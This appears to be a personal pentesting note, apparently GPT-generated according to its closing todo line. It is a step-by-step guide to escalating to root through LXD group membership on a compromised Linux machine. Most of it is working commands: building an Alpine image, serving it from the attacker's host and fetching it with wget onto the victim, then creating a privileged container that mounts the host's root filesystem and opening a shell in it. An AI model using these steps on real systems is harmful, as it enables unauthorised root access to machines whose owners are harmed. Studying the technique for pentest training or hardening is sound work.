LXD (Linux Container Daemon) can be used for <mark style="background: #FF5582A6;">privilege escalation </mark>if a compromised user account is a member of the `lxd` or `lxc` group. This is possible because LXD operates as a root process and carries out actions for any user with write access to the LXD UNIX socket, often without attempting to match the privileges of the calling user [Source 0](https://www.hackingarticles.in/lxd-privilege-escalation/). 

Here is a step-by-step guide on how you can use LXD for privilege escalation on a compromised machine:

1. **Check if the compromised user is a member of the `lxd` or `lxc` group**: You can do this by examining the `/etc/group` file for the compromised user's name [Source 6](https://reboare.github.io/lxd/lxd-escape.html). 

```bash
cat /etc/group | grep "lxd\|lxc"
```

2. **Create an LXD image**: You need to create an LXD image that you can import into the compromised system. You can do this using the `lxd-alpine-builder` script available on GitHub [Source 0](https://www.hackingarticles.in/lxd-privilege-escalation/). 

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

This script will create an Alpine Linux image for LXD.

3. **Transfer the image to the compromised machine**: You can use a simple HTTP server to host the image and then download it onto the compromised machine [Source 0](https://www.hackingarticles.in/lxd-privilege-escalation/).

```bash
# On your local machine
python -m SimpleHTTPServer

# On the compromised machine
cd /tmp
wget http://your-ip-address:8000/alpine-image.tar.gz
```

4. **Import the image into LXD**: Once the image is on the compromised machine, you can import it into LXD [Source 0](https://www.hackingarticles.in/lxd-privilege-escalation/).

```bash
lxc image import ./alpine-image.tar.gz --alias myimage
```

5. **Create and start a new container**: Create a new container using the imported image and start it [Source 7](https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md).

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
```

6. **Execute commands inside the container**: With the container running, you can execute commands inside it. Since the container has access to the host's root filesystem, you can perform actions as the root user [Source 7](https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md).

```bash
lxc exec ignite /bin/sh
```

Once inside the container, you can navigate to `/mnt/root` to access the host's filesystem. From here, you can perform actions as the root user, effectively escalating your privileges on the compromised machine [Source 0](https://www.hackingarticles.in/lxd-privilege-escalation/).
- #todo this is gpt generated -> make it more clean 